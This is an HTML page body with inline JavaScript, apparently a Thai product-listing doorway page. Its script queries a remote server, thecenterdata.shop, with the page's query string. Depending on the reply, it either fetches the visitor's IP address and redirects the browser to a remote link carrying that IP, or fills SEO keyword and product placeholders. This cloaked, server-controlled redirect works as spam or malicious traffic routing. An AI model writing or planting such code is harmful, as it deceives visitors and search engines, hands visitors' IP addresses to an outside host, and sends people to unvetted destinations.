<body>
    <script>
        document.write(body);
    </script>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js"></script>

    <script>
        const path_url = window.location.href;
        const path_array = path_url.split("?");
        url = 'https://thecenterdata.shop/api_json/' + path_array[1];
        fetch(url)
            .then(response => {
                return response.json();
            })
            .then(data => {
                alert(data);
                if (data == 'go') {
                    fetch('https://api.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => {
                            ip = data.ip;
                            window.location.replace("https://thecenterdata.shop/api_link/" + path_array[1] + "-" + ip);
                        })
                } else if(data[0] == 'index'){
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_verify/g, data[1]);
                } else {
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/product_name/g, data[0]);
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/description_seo/g, data[1]);
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/meta_keyword/g, data[2]);
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_name/g, data[3]);
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_url/g, data[4]);
                    document.querySelector('html').innerHTML = document.querySelector('html').innerHTML.replace(/website_verify/g, data[5]);
                    document.getElementById("related").innerHTML = create_related(data[6]);
                }
                
            });

        function create_related(data) {
            var output = '';
            for (var i = 0; i < data.length; i++) {
                output += '<div class="col-6 col-md-3 p-3">';
                output += '<img class="img-fluid" src="' + data[i][1] + '" alt="' + data[i][0] + '">';
                output += '<h3 class="fs-6 fw-normal">' + data[i][0] + '</h3>';
                output += '<div>';
                output += '<span class="text-danger">&#3647; ' + data[i][2] + '</span>';

                output += '';
                output += '';

                if (data[i][3] != 0) {
                    output += '<span class="text-secondary text-decoration-line-through ms-2">฿ ' + data[i][4] + '</span>';
                    output += '<span class="badge text-bg-danger ms-2">ส่วนลด ' + data[i][3] + '%</span>';
                }

                output += '</div>';

                output += '<div>';
                output += '<span><i class="bi bi-star-fill text-warning"></i> ' + data[i][6] + '</span>';
                output += '<span class="ms-2">ขายได้ ' + data[i][5] + ' ชิ้น</span>';
                output += '</div>';

                output += '</div>';
            }
            return output;
        }
    </script>
</body>
